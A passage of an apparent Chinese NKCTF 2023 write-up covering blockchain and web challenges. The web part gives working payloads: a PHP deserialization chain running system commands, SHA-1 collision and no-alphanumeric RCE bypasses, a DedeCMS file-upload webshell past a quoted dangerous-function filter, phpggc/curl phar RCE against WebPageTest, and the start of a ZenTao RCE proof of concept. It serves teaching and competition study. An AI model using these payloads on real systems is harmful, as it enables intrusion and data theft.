images_are_fun_</code></p><p>三段flag拼接起来<code>NKCTF&#123;TTF_IS_FUNNY_IMAGES_ARE_FUN_BITLOCKER_IS_VERY_INTERESTING&#125;</code></p><h1 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/signin-1.png"></p><h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>nc后先创建部署题目的合约账户<br>水龙头转账，部署合约</p><p>查看合约代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.7;<br><br>contract HelloWorld &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;Hello,NKCTF2023&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>setGreeting</code>改<code>greeting</code>的值即可</p><p>在<code>metamask</code>中链接题目给的私链</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-2.png"></p><p>使用<code>remix ide</code></p><p>编译后指定题目部署的地址</p><p>调用<code>setGreeting</code>，参数输出字符串<code>&quot;Hello,NKCTF2023&quot;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-3.png"></p><p>在Metamask确认交易请求</p><p>等待交易打包，确认上链</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-1.png"></p><h2 id="decompile-revenge"><a href="#decompile-revenge" class="headerlink" title="decompile_revenge"></a>decompile_revenge</h2><p>与第一题一样，不过sha256加密了<br>在提供的网站上解</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/decompile_revenge-1.png"></p><p><code>NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最终需要在Happy类中执行eval，<code>__invoke</code>在将对象当作函数来使用时调用此方法，在<code>Hell0</code>类中可以调用函数<code>$function()</code>以触发<code>__invoke</code>，而调用函数需要触发<code>__toString</code>方法，而在<code>Welcome</code>类中存在<code>echo</code>，可以触发<code>__toString</code></p><p>反序列化后会有一个waf方法来检查<code>$cmd</code>中的值是否存在<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>,<code>*</code>,<code>?</code></p><p>列目录：<code>dir /</code></p><p><code>O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-1.png"></p><p>读<code>/f1ag</code>：使用<code>gzdecode</code>编码绕过</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd=&#x27;system(&quot;more /*&quot;);&#x27;;</span><br><span class="hljs-comment">//echo urlencode(gzencode($cmd));</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;Hell0&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>=<span class="hljs-string">&#x27;gzdecode&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;Happy&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$a</span>-&gt;arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hell0</span>();<br><span class="hljs-variable">$a</span>-&gt;arg-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_php-2.png"></p><h2 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!!&#x27;</span>);<br>                        &#125;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!&#x27;</span>);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!&#x27;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!&#x27;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第一层md5弱比较，使用数组绕过<br><code>a[]=1&amp;b[]=2</code></p><p>第二层sha1强比较<br><code>c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></p><p>第三层数字比较缺陷，使用小数类型<br><code>e=114514.20</code></p><p>第四层php变量值特性，使用<code>[</code>代替<code>_</code><br><code>NS[CTF.go</code></p><p>第五层无字母数字rce，使用取反<br><code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p><h2 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h2><p>访问后台<code>/dede/</code>，用户名<code>admin</code>，密码<code>admin</code></p><p>左侧核心栏中有个文件式管理器，可以上传文件</p><p>存在过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不允许这些字符</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cfg_disable_funs</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cfg_disable_funs</span>) ? <span class="hljs-variable">$cfg_disable_funs</span> : <span class="hljs-string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-variable">$cfg_disable_funs</span>.<span class="hljs-string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$cfg_disable_funs</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="hljs-subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用<code>scandir</code>列目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用<code>include</code>读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/f1Aggg&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_cms-1.png"></p><h2 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h2><p>webpagetest反序列化</p><p><a href="https://xz.aliyun.com/t/11798">AVD-2022-1474319</a></p><p>借助<code>phpggc</code>生成执行<code>cat /flag</code>命令的<code>phar</code>文件并发送</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">./phpggc Monolog/RCE2 system &#x27;cat /flag&#x27; -p phar -o testinfo.ini<br><br>URLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/webpagetest-1.png"></p><h2 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h2><p>右键查看网页源代码得到版本为<code>18.0.beta1</code></p><p>github搜到<a href="https://github.com/webraybtl/zentaopms_poc/blob/main/poc_bypass_rce.py">poc</a></p><p>修改一下，加个回显，用<code>curl</code>外带到第三方平台<br><code>/flag</code>太长用<code>grep+base64</code>筛选</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># !/usr/bin/python</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">权限绕过+RCE 